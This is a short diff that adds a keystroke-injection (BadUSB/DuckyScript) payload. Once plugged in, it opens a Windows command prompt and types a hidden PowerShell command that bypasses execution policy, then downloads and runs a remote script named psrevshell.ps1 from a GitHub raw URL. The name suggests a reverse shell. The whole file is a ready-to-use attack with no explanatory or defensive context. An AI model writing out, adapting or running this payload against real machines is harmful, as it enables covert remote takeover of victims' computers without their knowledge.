@@ -1,0 +1,13 @@
+GUI r 
+DELAY 500
+STRING cmd.exe
+ENTER 
+DELAY 200
+STRING powershell -w h -NoP -NonI -Exec Bypass iex(iwr https://raw.githubusercontent.com/bissgit/psrevshell/main/psrevshell.ps1)
+ENTER
+ENTER
+REM @@ Minimise
+DOWN
+DOWN
+DOWN
+ENTER
